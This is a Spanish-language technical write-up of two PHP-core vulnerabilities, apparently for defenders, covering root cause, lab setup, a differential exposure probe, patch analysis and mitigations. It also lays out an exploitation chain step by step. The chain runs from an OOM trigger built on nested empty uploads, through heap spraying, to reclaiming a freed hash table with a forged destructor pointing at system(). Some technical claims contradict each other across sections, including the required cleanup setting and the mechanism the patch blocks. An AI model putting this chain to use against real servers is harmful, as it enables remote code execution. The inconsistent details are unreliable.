# PHP2Shell — Anatomía de CVE-2026-109618 y CVE-2026-109619

### De un use-after-free en la capa de sesiones de PHP a RCE sin autenticación

**Autor:** Chain-Cortex · JARVIS 🛡️
**Fecha:** 27 de octubre de 2026
**CVSS v4.0:** 9.2 (Crítico) en ambos CVEs
**Estado:** Explotación activa reportada · PoC público disponible

---

> **English edition:** the full article is also published in English at
> https://github.com/santilpz28/php2shell-pub-en

---

## 0. TL;DR para el que tiene 30 segundos

El 21 de octubre de 2026 el proyecto PHP publicó una release de emergencia que corregía **dos** vulnerabilidades críticas en el **núcleo** del lenguaje, no en ninguna aplicación:

| CVE | Nombre informal | Tipo | Efecto |
|---|---|---|---|
| CVE-2026-109619 | PHP2Shell (rama UAF) | Use-after-free en `session.upload_progress` | RCE + divulgación de memoria |
| CVE-2026-109618 | PHP2Shell (rama OOM) | Corrupción de memoria por `longjmp()` en OOM | RCE + divulgación de memoria |

Lo que lo hace especialmente nasty:

- **No es un bug de aplicación.** Es un bug del intérprete. Cualquier endpoint que acepte un upload multipart es vulnerable, aunque el código de la aplicación sea perfecto.
- **No requiere autenticación.** No hay que pasar por un login.
- **No requiere configuración exótica.** `session.upload_progress.enabled=On` es el **default de fábrica** desde PHP 5.
- **El parche fue de emergencia** (21 oct, 14:00 UTC) porque los detalles se filtraron antes de la divulgación oficial. CISA, Cisco, Akamai, Vercel, Laravel, Autodesk, IC3 y CERT-EU publicaron alertas el mismo día.
- **PHP 7.4, 8.0 y 8.1 están fuera del ciclo regular de desarrollo**, pero el
  proyecto PHP **sí publicó backports mínimos de código fuente** para esas
  ramas. Lo que no existe es el ciclo regular de releases: la actualización
  depende del paquete de tu distro o de aplicar el backport a mano.

Y un detalle que explica el nombre: el mecanismo de entrega es esencialmente **Heartbleed aplicado a PHP**. Al igual que en Heartbleed, un atacante puede leer memoria del proceso — incluyendo datos de *otros* usuarios — antes de poder escalar a ejecución de código.

> **Validado contra el advisory oficial.** El advisory del proyecto PHP
> (`GHSA-6wmf-4rv5-p3rp`, 21-oct-2026) describe el fallo en términos
> abstractos —«*global state retained by a worker but pointing to memory owned
> by one request*», «*a fatal error, **including one caused by memory
> exhaustion***», «*a later operation that runs before normal request
> initialization can consume the stale value*»— y propone un modelo de
> **productor + consumidor** en requests distintos del mismo worker. La rama
> `session.upload_progress` que se mide aquí es **una** concreción de ese
> modelo. El mapping punto por punto está en §10.12.

**El eslabón que casi nadie menciona:** la cadena no empieza con un UAF, sino
con un **agotamiento de memoria**. El atacante provoca un OOM durante el parseo
multipart; PHP aborta la request con un `longjmp` que **salta por encima del
cleanup**; el heap se libera pero el worker sobrevive con punteros colgando; y
el request siguiente los consume. Eso explica por qué el parche sustituye el
`longjmp` por un error blando, y por qué `pm.max_requests=1` rompe la
explotabilidad en FPM. En la sección 10 está la medición completa.

---

## 1. Requisitos previos de explotación

Según el análisis de Akamai Security Intelligence Group y JFrog Security, el ataque requiere:

1. **PHP 5 o posterior** vulnerable (sin el parche de octubre).
2. **`session.upload_progress.enabled=On`** → default de fábrica.
3. **`session.upload_progress.cleanup=On`** → también default de fábrica. Es
   imprescindible: es `php_session_rfc1867_cleanup()` la que, en el segundo
   request, llama a `php_session_initialize()` y consume el estado colgante.
   Con `cleanup=Off` esa ruta no existe y la cadena no arranca.
4. **Un endpoint que acepte uploads multipart** — incluso uno que los ignore.
   - Clave: la capa de sesiones procesa `upload_progress` **antes** de que se
     ejecute el código de usuario, y por tanto antes de que los módulos estén
     activados.
5. **Un OOM (o fatal) durante el parseo multipart** que interrumpa la request
   antes del cleanup. Se consigue con ~536 KB de cuerpo HTTP (§2.6).
6. **El mismo worker** debe atender el request siguiente. En `mod_php` esto
   funciona; en **PHP-FPM el worker muere** al fallar el arranque, y por eso
   la recomendación oficial incluye `pm.max_requests=1`.
7. **La dirección base de `libphp.so` en runtime**, o una fuga de ASLR que la
   proporcione. Este es el punto que hace que esto no sea un "`curl` y listo".

Los puntos 5 y 6 son los que la mayoría de descripciones omiten, y son
precisamente los que marcan la diferencia entre "es vulnerable" y "es
explotable en mi despliegue".

---

## 2. Anatomía del fallo: la raíz común (OOM → longjmp → estado colgante)

> **Nota de rigor:** esta sección fue reescrita tras contrastar el análisis con
> el código fuente de PHP 8.2.34, el parche oficial `31c0ea7d7ff` y los
> writeups de Calif Research, JFrog y Wiz, y después de **aislar
> experimentalmente** el puntero responsable con controles A/B (§10). La
> primera versión de este artículo proponía un mecanismo (reinicio concurrente
> de la sesión) que la experimentación **descartó**.

### 2.1 La raíz común: un OOM que abandona el cleanup

Ambos CVEs son, en el fondo, el **mismo patrón**:

```
publicar estado  →  trabajo que puede fallar  →  inicializar / confirmar
                                              ↑
                        un fatal no local (OOM) salta por encima del commit
                                              ↓
        el consumidor siguiente confía en un estado que nunca se inicializó
```

En PHP, ese "salto" es un `zend_bailout()` (un `longjmp` disfrazado) que se
dispara cuando una asignación no puede servirse.

El caso concreto está en `ext/session/session.c`. El módulo de sesión publica
estado en sus globales **antes** de que los módulos estén activados:

```c
/* main/main.c — php_request_startup() */
PG(modules_activated) = 0;
/* ... */
php_hash_environment();   /* parsea $_POST y el multipart */
zend_activate_modules();  /* RINIT de cada módulo */
PG(modules_activated) = 1;
```

Y el handler de upload-progress escribe en las globales de sesión durante ese
parseo:

```c
/* ext/session/session.c — MULTIPART_EVENT_FILE_START */
if (Z_ISUNDEF(progress->data)) {
    /* ... */
    php_rinit_session(0);
    PS(id) = zend_string_copy(Z_STR(progress->sid));   /* <-- publica puntero */
    /* ... */
}
php_session_rfc1867_update(progress, 0);                /* <-- inicializa PS(http_session_vars) */
```

### 2.2 El cleanup que se salta

El cleanup normal ocurre en el callback `MULTIPART_EVENT_END` y en el RSHUTDOWN
del módulo de sesión. Pero `php_request_shutdown()` **conditiona** la
desactivación de módulos al flag:

```c
/* main/main.c — php_request_shutdown() */
if (PG(modules_activated) {
    zend_deactivate_modules();   /* <-- NO se ejecuta: el flag sigue a 0 */
}
/* ... */
shutdown_memory_manager(CG(unclean_shutdown) || !report_memleaks, 0);
                                                            /* <-- el heap SE LIBERA igual */
```

Y el camino de Apache ejecuta el shutdown incluso tras el fallo de arranque:

```c
/* sapi/apache2handler/sapi_apache2.c */
zend_first_try {
    if (php_apache_request_ctor(r, ctx) != SUCCESS) {
        zend_bailout();
    }
    /* ... ejecuta el script ... */
} zend_end_try();

if (!parent_req) {
    php_apache_request_dtor(r);   /* -> php_request_shutdown(NULL) */
}
```

**Resultado del Request A:**

| Paso | Qué ocurre | Estado |
|---|---|---|
| 1 | `MULTIPART_EVENT_FILE_START` → `php_rinit_session(0)` | `PS(id)` apunta al heap de la request |
| 2 | `php_session_rfc1867_update()` → `php_session_initialize()` | `PS(http_session_vars)` apunta al heap de la request |
| 3 | El parseo multipart agota `memory_limit` → `zend_bailout()` | `MULTIPART_EVENT_END` **no se ejecuta** |
| 4 | `PG(modules_activated)` sigue a `0` → RSHUTDOWN de session **no se ejecuta** | Las globales de sesión **conservan** los punteros antiguos |
| 5 | `shutdown_memory_manager()` se ejecuta igualmente | **El heap de la request se libera** |

El worker de Apache sobrevive. Sus globales de sesión apuntan a memoria que ya
no pertenece a nadie.

### 2.3 El Request B: el consumidor

El segundo request llega al mismo worker y **no pasa por `FILE_START`** (no
tiene parte de fichero), así que no hay reset:

```c
/* ext/session/session.c — MULTIPART_EVENT_END */
if (Z_TYPE(progress->sid) && progress->key.s) {
    if (PS(rfc1867_cleanup)) {
        php_session_rfc1867_cleanup(progress);   /* <-- entra aquí */
    }
    /* ... */
}
```

Y `php_session_rfc1867_cleanup()` es donde se consume el estado colgante:

```c
static void php_session_rfc1867_cleanup(php_session_rfc1867_progress *progress)
{
	php_session_initialize();                              /* <-- LEE PS(id) COLGANTE */
	PS(session_status) = php_session_active;
	IF_SESSION_VARS() {
		zval *sess_var = Z_REFVAL(PS(http_session_vars)); /* <-- USA EL PUNTERO COLGANTE */
		SEPARATE_ARRAY(sess_var);
		zend_hash_del(Z_ARRVAL_P(sess_var), progress->key.s); /* <-- OPERA SOBRE MEMORIA LIBERADA */
	}
	php_session_flush(1);
}
```

Y `php_session_initialize()` lee el `zend_string` colgante en su primera línea
de sesión:

```c
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {   /* <-- lee PS(id) liberado */
```

**Aquí están las dos armas:**

- **Divulgación de memoria**: `PS(id)` es un `zend_string*` liberado. Su
  contenido son bytes de heap arbitrarios, y su longitud (`ZSTR_LEN`, en el
  offset 16 de la estructura) también. Si esa longitud sobrevive intacta y
  apunta a memoria mapeada, `php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)))`
  —que se ejecuta al construir la cabecera `Set-Cookie`— copia esa memoria viva
  del proceso a la respuesta HTTP. Eso es **Heartbleed aplicado a PHP**.
- **RCE**: `PS(http_session_vars)` es una `zend_array` liberada. Al destruirla
  (`zend_hash_del` → `zend_array_destroy`), PHP invoca su `pDestructor`. Si esa
  tabla ha sido **reclamada** por el atacante con un `pDestructor` falsificado
  apuntando a `zif_system`, la ejecución es directa.

### 2.4 Qué puntero es el responsable (aislado experimentalmente)

Esta pregunta no es trivial y la experimentación la resuelve de forma
inequívoca. El protocolo y los resultados están en §10.3:

| Experimento | Resultado | Conclusión |
|---|---|---|
| Request B con el **mismo** `PHPSESSID` | crash 4/4 | — |
| Request B con un `PHPSESSID` **distinto** | crash 4/4 | El crash **no depende** de `PS(id)` leído como SID de la request |
| Request B **sin** `PHP_SESSION_UPLOAD_PROGRESS` | crash 0/4 | El camino `cleanup` es **imprescindible** |
| Request B **normal** (GET) tras el OOM | crash 0/4 | El worker está **sano**; no hay corrupción general |
| Request B con `upload_progress` **sin** OOM previo | crash 0/4 | El OOM es **necesario** |

La conclusión es que el puntero que provoca el fallo es **`PS(http_session_vars)`**
—la tabla hash de sesión liberada—, y no el `zend_string` del identificador.
Eso tiene una consecuencia práctica importante: **la ruta de RCE es la de la
tabla hash**, no la del string, y por eso la sección 2.5 corrige un error
frecuente en la literatura.

### 2.5 La escalada a ejecución de código: tabla hash, no `zend_internal_function`

Un resultado negativo con valor didáctico, y una corrección importante: la
forja de una `zend_internal_function` (con `handler` en el offset 72) y su
deposición como spray **no** es el mecanismo de la RCE.

El layout real de `zend_internal_function` en PHP 8.2 de 64 bits (verificado
con un programa C de `offsetof` contra `Zend/zend_compile.h`) es:

```c
     0 type | 4 fn_flags | 8 function_name | 16 scope | 24 prototype
    32 num_args | 36 required_num_args | 40 arg_info | 48 attributes
    56 T | 64 run_time_cache | 72 handler | 80 module
```

`handler` en el offset **72** y `module` en el **80** son los que importan. Y
el tamaño total es **136 bytes**, no los 288 que circulan en la literatura
—esa cifra corresponde al tamaño total de la asignación en el heap, que
incluye el `zend_string` que envuelve el valor del campo POST más el padding
del allocator.

El motivo por el que esa estrategia no funciona es la **firma**:

- Una `zend_internal_function` describe una *función*, y su invocación exige un
  `zend_execute_data` válido (parámetros, valores de retorno, contexto de
  llamada). Forjarla y depositarla no basta para que se ejecute.
- Un `zend_array`, en cambio, tiene un `pDestructor` que `zend_array_destroy`
  invoca **directamente con un `zval*` como único argumento** — que es
  exactamente la firma de `zif_system` (`ZEND_FUNCTION(system)` recibe un
  `zval*` y un `zval*` de retorno).

Esa diferencia, aparentemente menor, separa un exploit que funciona de uno que
no. La primitiva correcta es:

```
1. Request A: OOM -> PS(http_session_vars) queda colgando
2. El heap liberado contiene la zend_array de la sesion
3. Reclamar ese slot con una zend_array forjada:
      - nTableSize / nTableMask coherentes
      - arData apuntando a un array de buckets controlado
      - pDestructor = zif_system
      - un bucket cuyo valor sea un zend_string con el comando
4. Request B: php_session_rfc1867_cleanup() -> zend_hash_del() ->
   zend_array_destroy() -> pDestructor(&valor) -> system("cmd")
```

El spray (149 entradas × 288 bytes documentado por Akamai) sirve aquí para
**saturar** el slot liberado con objetos del mismo tamaño de asignación, de
modo que la tabla hash forjada aterrice en la dirección correcta. No es
precisión quirúrgica: es saturación.

### 2.6 El disparador de OOM: cómo agotar `memory_limit` con un payload pequeño

Este es el detalle que hace la cadena practicable. El objetivo es provocar un
OOM con un cuerpo HTTP **pequeño**, para no delatar el ataque por su tamaño.

Calif Research descubrió dos bypass. El segundo es el elegante:

> Un *file part* con `filename=""` **no cuenta** para `max_file_uploads`, pero
> PHP **sí** crea las seis entradas correspondientes de `$_FILES` (`name`,
> `full_path`, `type`, `tmp_name`, `error`, `size`).
>
> Si el nombre del campo está anidado (`files[a][b][c]...`), PHP debe crear esa
> jerarquía **por separado** para cada una de las seis entradas. Un solo
> registro de upload vacío se expande en **muchas** tablas hash, buckets y
> strings. Cientos de esos registros ocupan más de 128 MiB de heap PHP
> manteniendo el cuerpo HTTP por debajo de `post_max_size`.

Detalle crítico de implementación: **cada registro necesita un nombre de
primer nivel distinto** (`f0`, `f1`, `f2`, ...). Si todos comparten prefijo
(`files[a][b]`), PHP los fusiona en un único árbol y no se crea presión de
memoria real. Es un error sutil que secuenta como "no funciona" si no se
verifica.

Medición en el laboratorio (PHP 8.2.34, `memory_limit=32M`):

| Registros | Anidamiento | Cuerpo HTTP | Resultado |
|---|---|---|---|
| 3000 | 12 niveles | **536 KB** | `Allowed memory size of 33554432 bytes exhausted` |

536 KB de tráfico para agotar 32 MB de heap: una proporción de ~60×.

### 2.7 Por qué el "mismo worker" es un requisito duro

El estado colgante vive en la memoria del proceso, no en disco. Por eso el
Request B **tiene que** ser atendido por el mismo worker del Request A.

Esto explica la diferencia entre SAPIs, que no es trivial:

| SAPI | Comportamiento ante fallo de arranque | ¿Hay segundo request? |
|---|---|---|
| **mod_php** | `php_apache_request_dtor()` → `php_request_shutdown()` → heap liberado, **worker sobrevive** | **Sí** → explotable |
| **PHP-FPM** | `php_module_shutdown()` + `return FPM_EXIT_SOFTWARE` → **el worker muere** | No → no explotable |

De ahí la recomendación oficial de `pm.max_requests=1` en FPM: obliga a rotar
los workers y rompe el requisito de mismo worker.

Conviene matizar un punto: en Apache con `mpm_prefork`, el worker **no muere**
tras el OOM (el Request A responde 200 con el fatal, y el proceso sigue
atendiendo peticiones normales con normalidad, 6/6 en los controles). El
worker **muere** después, en el Request B, cuando consume el puntero colgante
y revienta con SIGSEGV. La distinción importa: el OOM por sí solo no rompe
nada; lo que lo rompe es el **consumo posterior del estado**.

### 2.8 La cadena completa

```
1. Request A: multipart con PHP_SESSION_UPLOAD_PROGRESS + un file part
   -> FILE_START publica PS(id) y PS(http_session_vars) en el heap de la request
2. Request A (continuación): uploads anidados vacios -> OOM
   -> MULTIPART_EVENT_END se salta, RSHUTDOWN se salta, el heap se libera
   -> el worker sobrevive con las globales colgando
3. Request B: multipart SIN file part, mismo worker, con PHP_SESSION_UPLOAD_PROGRESS
   -> MULTIPART_EVENT_END -> cleanup -> php_session_initialize()
   -> opera sobre PS(http_session_vars) liberada -> UAF
4. Con la memoria reclamada de forma controlada:
   -> PS(http_session_vars) es una tabla hash falsificada
   -> su pDestructor = zif_system -> system("cmd") al destruirla
```

---

## 3. Anatomía del fallo: CVE-2026-109618 (el `longjmp` que rompe el cleanup)

El parche oficial (`31c0ea7d7ff`) confirma que **ambos** CVEs son el mismo
patrón visto desde dos ángulos, y su título lo dice sin rodeos:
*"Avoid state corruption via bailout"*.

**CVE-2026-109618** es el ángulo "generico":

1. El atacante provoca un OOM (u otro fatal) **durante una operación que ha
   publicado estado en una variable global persistente**.
2. PHP aborta la request con `zend_bailout()` (un `longjmp`), que **salta por
   encima del código de limpieza local**.
3. La variable global conserva un puntero a memoria que el shutdown va a liberar.
4. La **request siguiente**, atendida por el mismo worker, consume ese estado
   como si fuera vivo.

**CVE-2026-109619** es el ángulo "específico": el estado persistente concreto es
el de la sesión durante el upload-progress (lo detallado en la sección 2).

El parche ataca el patrón por la raíz, en tres movimientos:

| Capa | Qué hace | Dónde |
|---|---|---|
| **Raíz** | El OOM deja de ser un `longjmp`; pasa a ser un error blando en el siguiente *safe point* (o un `_exit()` duro por encima de un umbral) | `main/main.c` / `Zend/zend_execute.c` |
| **Defensa en profundidad** | Al resetear todo el estado que sobrevive entre requests (backtrace, OPcache, sesión, estado de error), nada queda colgando | varios módulos |
| **Específico de sesión** | `PS(in_rfc1867_update)` fuerza `__PHP_Incomplete_Class` durante el decode, y `if (PG(modules_activated)) return retval;` impide que el callback corra fuera de la ventana legítima | `ext/session/session.c` |

La diferencia conceptual entre las dos ramas, ya con el mecanismo real medido:

| | CVE-2026-109619 (upload-progress) | CVE-2026-109618 (genérico) |
|---|---|---|
| Trigger | OOM durante el parseo multipart | Cualquier fatal tras publicar estado global |
| Mecanismo | `PS(id)` / `PS(http_session_vars)` colgando | Backtrace de fatal error / estado de OPcache colgando |
| Consumidor | `php_session_rfc1867_cleanup()` → `php_session_initialize()` | El siguiente request que toque ese global |
| SAPI afectado | mod_php (FPM mata el worker) | mod_php **y** FPM (si el fatal ocurre tras un arranque exitoso) |
| Arma | Divulgación de memoria + corrupción | RCE y corrupción de estado compartido |

---

## 4. ¿Por qué "PHP2Shell"?

El nombre viene del paralelismo con **Shellshock** (CVE-2014-6271) y del vector de entrega: al poder escribir bytes arbitrarios en memoria heap, el atacante puede forjar **cualquier** función interna de PHP, no solo `system()`. Desde ahí:

```c
system("id")            // ejecución de comandos
exec("...")             // idem, ejecución de comandos
file_get_contents(...)  // lectura de ficheros
phpinfo()               // fingerprinting
```

Es "shell" porque el resultado final es una shell. Es "PHP" porque el bug está en el intérprete, no en la aplicación. Es "2" porque son dos CVEs encadenados.

---

## 5. Construcción del laboratorio

Todo el trabajo siguiente se hizo en un entorno **aislado** (Docker, red local, sin exposición pública).

### 5.1 Arquitectura

```
┌─────────────────────────┐        ┌─────────────────────────┐
│  php2shell-vuln        │        │  php2shell-patched      │
│  PHP 8.2.34             │        │  PHP 8.2.35             │
│  Apache + mod_php       │        │  Apache + mod_php       │
│  localhost:8080         │        │  localhost:8081         │
│  [VULNERABLE]           │        │  [PARCHEADO]            │
└─────────────────────────┘        └─────────────────────────┘
```

Se usa **Apache + mod_php** (y no `php -S` ni FPM) porque el RCE confirmado de la rama UAF requiere que el estado stale sobreviva entre peticiones **en el mismo worker**, algo que el modelo prefork de Apache garantiza de forma natural.

### 5.2 Configuración crítica del target

```ini
; ext/session/php_session.h — requisitos de explotación
session.upload_progress.enabled = On   ; default de fábrica
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.min_freq = 1  ; el atacante debe pausar > 1s
session.upload_progress.cleanup = Off
session.save_path = /tmp/
memory_limit = 256M
```

Y en Apache, el módulo `upload_progress` (necesario para que muchas instalaciones muestren barras de progreso):

```apache
UploadProgressSharedMemorySize 1024
```

> ⚠️ **Aclaración importante (verificada en el código fuente):** el `upload_progress` de **PHP** y el módulo Apache `mod_upload_progress` son **mecanismos independientes**.
>
> - El de **PHP** (`session.upload_progress.*`) escribe el estado del upload en el **fichero de sesión** (`session.save_path`) y es el que participa en la vulnerabilidad. Es un mecanismo **del núcleo**, disponible con cualquier SAPI.
> - El de **Apache** (`mod_upload_progress`) es un cache en shared memory para que un frontend pueda *consultar* el progreso de un upload en curso. **No participa en el UAF.**
>
> El módulo Apache **no es necesario** para explotar la vulnerabilidad. Se incluye en el lab porque es el que usan muchas instalaciones reales para las barras de progreso, y porque su configuración era una fuente habitual de errores durante el montaje.
>
> Detalle de versiones: el paquete `libapache2-mod-upload-progress` moderno usa `UploadProgressSharedMemorySize`. Las variantes antiguas usaban `UploadProgressCacheDir`. Si ves `Invalid command 'UploadProgressCacheDir'`, tienes una versión moderna.

### 5.3 Objetivo de aplicación

La aplicación es deliberadamente inocua. Este es un punto clave para el blog: **el bug no está aquí**.

```php
<?php
// index.php — endpoint que acepta uploads y los ignora
if (isset($_GET['probe'])) {
    echo "PHP_VERSION=" . phpversion() . "\n";
    echo "SAPI=" . php_sapi_name() . "\n";
    echo "SESSION_UPLOAD_PROGRESS_ENABLED=" . ini_get('session.upload_progress.enabled') . "\n";
    // ... deteccion de parche por tabla de versiones
}

$uploaded = [];
foreach ($_FILES as $field => $info) {
    $uploaded[] = sprintf('%s: name=%s size=%d', $field, $info['name'], $info['size']);
}
echo "SESSION:\n";
foreach ($_SESSION as $k => $v) {
    echo "  $k => " . json_encode($v) . "\n";
}
```

### 5.4 Versiones parcheadas por rama

| Rama | Versión parcheada | Estado |
|---|---|---|
| 8.2.x | **8.2.35** | Soporte hasta 31 dic 2026 |
| 8.3.x | **8.3.36** | Soportada |
| 8.4.x | **8.4.27** | Soportada |
| 8.5.x | **8.5.12** | Soportada (añade `fatal_error_backtraces=0`) |
| 7.4.x | backport mínimo publicado por PHP | Fuera del ciclo regular: actualizar vía distro o backport manual |

---

## 6. El test diferencial: prueba de exposición sin RCE

Un detector que necesita offsets y ASLR no sirve para una auditoría rápida. El test que construimos es **puramente funcional** y discrimina de forma fiable.

### 6.1 La idea

- En PHP **vulnerable**, el handler de `upload_progress` se ejecuta y **escribe el estado del upload en `$_SESSION`**.
- En PHP **parcheado**, el callback aborta (`if (PG(modules_activated)) return retval;`) y la sesión **no se modifica**.

La diferencia es observable desde fuera: la presencia o ausencia de la clave `upload_progress_<valor>` en la sesión.

### 6.2 Implementación

La clave técnica es el **control fino del stream TCP**: necesitamos pausar la escritura del body multipart a mitad de camino para que elapsed del reloj supere `session.upload_progress.min_freq`.

```python
import socket, time

def upload_probe(host, port, session_id, progress_key, delay=1.6):
    boundary = "----php2shellDiff1234567890"

    phase1  = field("PHPSESSID", session_id)
    phase1 += field("PHP_SESSION_UPLOAD_PROGRESS", progress_key)
    phase1 += file_field("file", "probe.bin", b"P" * 4096)   # <- FILE_START

    phase2  = b"".join(
        field("t[]", b"A" * 288) for _ in range(149)        # <- heap spray
    )

    phase3  = file_field("file2", "probe2.bin", b"Q" * 2048) # <- trigger
    phase3 += b"--" + boundary.encode() + b"--\r\n"

    body = phase1 + phase2 + phase3
    head = (f"POST /index.php HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n").encode()

    s = socket.create_connection((host, port), timeout=20)
    s.sendall(head + phase1)
    time.sleep(delay)           # <<< LA PAUSA: dispara el segundo update()
    s.sendall(phase2 + phase3)
    # ... leer respuesta
```

### 6.3 Resultados obtenidos

**Target VULNERABLE (PHP 8.2.34):**

```
PHP 8.2.34 | SAPI apache2handler
SESSION_ID=
UPLOADS:
  file: name=probe.bin size=4096 error=0
  file2: name=probe2.bin size=2048 error=0
SESSION:
  upload_progress_behavcheck => {"start_time":1793121467,"content_length":61359,
    "bytes_processed":61359,"done":true,"files":[
      {"field_name":"file","name":"probe.bin","bytes_processed":4096},
      {"field_name":"file2","name":"probe2.bin","bytes_processed":2048}]}
```

**Target PARCHEADO (PHP 8.2.35):**

```
PHP 8.2.35 | SAPI apache2handler
SESSION_ID=
UPLOADS:
  file: name=probe.bin size=4096 error=0
  file2: name=probe2.bin size=2048 error=0
SESSION:
  (vacia)
```

### 6.4 Interpretación

| Target | `upload_progress_*` en sesión | Veredicto |
|---|---|---|
| 8.2.34 | ✅ Presente | **VULNERABLE** — el handler escribe estado, el UAF es alcanzable |
| 8.2.35 | ❌ Ausente | **PARCHEADO** — el callback aborta, la cadena está cortada |

> **Limitación honesta del método:** este test demuestra **exposición** (que la rama UAF es alcanzable), no ejecución de código. El RCE completo requiere además resolver los offsets del binario o filtrar ASLR. Para auditoría y priorización de parches, la exposición es la métrica que importa: si el test da positivo, hay que parchear ya.

---

## 7. Qué hace exactamente el parche

El parche oficial (`31c0ea7d7ff`, "Avoid state corruption via bailout") **no reescribe** el código vulnerable. Es una defensa en capas. Y esto es fascinante desde el punto de vista de la ingeniería de seguridad:

### 7.1 Capa 1 — Resetear el estado en el arranque del upload

```c
case MULTIPART_EVENT_START: {
    multipart_event_start *data = (multipart_event_start *) event_data;

    /* This runs before RINIT, so we need to clear these early */
    php_rinit_session_globals();

    progress = ecalloc(1, sizeof(php_session_rfc1867_progress));
    /* ... */
}
```

### 7.2 Capa 2 — Impedir la segunda ejecución del callback (¡la clave!)

```c
if (PG(modules_activated)) {
    /* request_parse_body(). Do not run here as it corrupts the session. */
    return retval;
}
```

Este es **el** fix que corta la cadena del UAF. El callback de multipart se invoca en dos momentos: durante el parseo de la petición (antes de RINIT) y de nuevo desde `request_parse_body()`. La segunda invocación, con `PG(modules_activated)` ya a 1, es la que producía el `update()` → flush → re-init → free. Abortando ahí, **Tree-A nunca se libera** y los punteros cacheados nunca quedan colgantes.

### 7.3 Capa 3 — Forzar `__PHP_Incomplete_Class` durante el decode

```c
/* The upload progress handler (php_session_rfc1867_update()) decodes and
 * re-encodes the session during request startup, before RINIT, when no
 * user code may run. Objects are then kept as __PHP_Incomplete_Class: no
 * autoloading, no unserialize_callback_func, no __wakeup() or __unserialize(),
 * and they are written back unchanged. */
static void php_session_unserialize_init(php_unserialize_data_t *var_hash)
{
    PHP_VAR_UNSERIALIZE_INIT(*var_hash);
    if (PS(in_rfc1867_update)) {
        php_var_unserialize_set_incomplete_classes_only(*var_hash, true);
    }
}
```

Esto cierra además la **object injection** vía el fichero de sesión. El atacante controla bytes del fichero de sesión a través del nombre del fichero subido (`$_SESSION["upload_progress_x"]["files"][0]["name"]`). Sin esta capa, podía instanciar clases arbitrarias con `__wakeup()` / `__destruct()` maliciosos. Con ella, los objetos se decodifican como `__PHP_Incomplete_Class` inerte.

### 7.4 Capa 4 — Eliminar el `longjmp()` en OOM

El commit sustituye el bailout por OOM (`longjmp()`) por un `UnwindExit` / error suave en el siguiente *safe point* de la VM. Así el cleanup **siempre** se ejecuta y el puntero **siempre** se limpia antes de liberar la memoria. Esto cierra la rama CVE-2026-109618.

### 7.5 Capa 5 — Reset defensivo del estado persistente

En el shutdown, todo el estado de larga vida (backtrace, OPcache, sesión, estado de error) se resetea, de modo que nada "stale" sobreviva a la siguiente petición. Incluido el `zend_delete_global_variable("_SESSION")` en el `MULTIPART_EVENT_END`.

---

## 8. Remedios

### 8.1 Remedio primario — actualizar (obligatorio)

| Acción | Prioridad |
|---|---|
| Actualizar a **8.2.35 / 8.3.36 / 8.4.27 / 8.5.12** | **Inmediata** |
| Si usas **7.4 / 8.0 / 8.1**: migrar al ciclo soportado, o aplicar el backport de PHP. | **Crítica** |
| Reiniciar **todos** los workers tras actualizar (Apache + FPM + php-fpm reload) | **Inmediata** |
| Verificar la versión real en runtime, no la del paquete | **Inmediata** |

```bash
# Verificar versión en runtime
php -r 'echo PHP_VERSION, PHP_EOL;'

# Apache: reiniciar workers
sudo systemctl restart apache2

# PHP-FPM: recargar todos los pools
sudo systemctl reload php8.2-fpm   # o restart para guarantee

# FPM: recommendation defensiva adicional
# pm.max_requests=1  (rompe el requisito de "mismo worker")
```

### 8.2 Mitigaciones parciales (si no puedes actualizar ya)

Estas son **parciales**. Cada una cubre un brazo y deja el otro abierto.

```ini
; Desactivar upload_progress: cierra la rama UAF (CVE-2026-109619)
; en la mayoría de las instalaciones. Es la mitigación más efectiva.
session.upload_progress.enabled = 0

; En PHP 8.5+: neutralizar la rama de backtraces (CVE-2026-109619)
fatal_error_backtraces = 0
```

### 8.2.1 Dos mitigaciones que el advisory no menciona, pero que el
laboratorio demuestra que funcionan

Estas se deducen del mecanismo real (OOM → estado colgante) y se verificaron
empíricamente en el laboratorio de este trabajo:

```ini
; Limita el numero de partes del multipart. Con el limite activo, PHP corta
; la peticion con "Multipart body parts limit exceeded" ANTES de que se
; agote la memoria, y la cadena de explotacion no llega a arrancar.
; Valor por defecto en las imagenes oficiales de PHP: 1500.
; ATENCION: 0 NO significa "ilimitado" (significa "usa el default").
; Para desactivar el limite: -1.
max_multipart_body_parts = 1000

; Limita el numero de ficheros por peticion. Con el default (20), PHP deja
; de procesar los uploads anidados y el heap nunca se agota.
max_file_uploads = 20
```

**Limitación importante de ambas:** mitigan el **trigger** (el OOM), no la
vulnerabilidad. Si algún otro camino del núcleo permite agotar la memoria
—un body grande, una petición recursiva, un endpoint que deserialice
payloads enorme— las mitigaciones no Activate. La única defensa completa
sigue siendo actualizar el intérprete.

**Y una comprobación rápida para tu flota**, basada en el hecho de que el
parche oficial **elimina el OOM por completo** (lo convierte en un error
blando, según su propio título *"Avoid state corruption via bailout"*). El
script `check_exposure.sh` de este repositorio la automatiza:

```bash
./check_exposure.sh https://tu-app.example.com/upload
```

```
$ ./check_exposure.sh http://127.0.0.1:8080/index.php     # 8.2.34
[!] VULNERABLE: el servidor agoto su memoria durante el parseo multipart.
    exit=1

$ ./check_exposure.sh http://127.0.0.1:8081/index.php     # 8.2.35
[+] NO vulnerable: no se disparo el OOM (probablemente PHP parcheado).
    exit=0
```

La sonda **no explota**: solo provoca el OOM y mira la respuesta. Es
detectable y auditable, a diferencia de un exploit. Aun así, provoca un
agotamiento de memoria en el servidor: úsala solo contra sistemas tuyos o con
autorización escrita explícita.

Detalle que conviene no pasar por alto: la sonda necesita **miles** de
partes multipart anidadas, no una. Cada parte necesita además un nombre de
**primer nivel distinto** (`f0`, `f1`, ...). Una sola parte anidada no
provoca OOM, y esta es la razón por la que muchas comprobaciones manuales de
esta vulnerabilidad dan un falso negativo.

```bash
# Tras cambiar cualquier INI: reiniciar TODOS los workers
sudo systemctl restart php8.2-fpm
sudo systemctl restart apache2
```

> ⚠️ **Advertencias del advisory oficial:**
> - El flag de `upload_progress` **no** afecta a los brazos de OPcache ni de backtrace.
> - `memory_limit=-1` **elimina** la protección contra agotamiento de recursos (no lo hagas salvo que tengas otros controles).
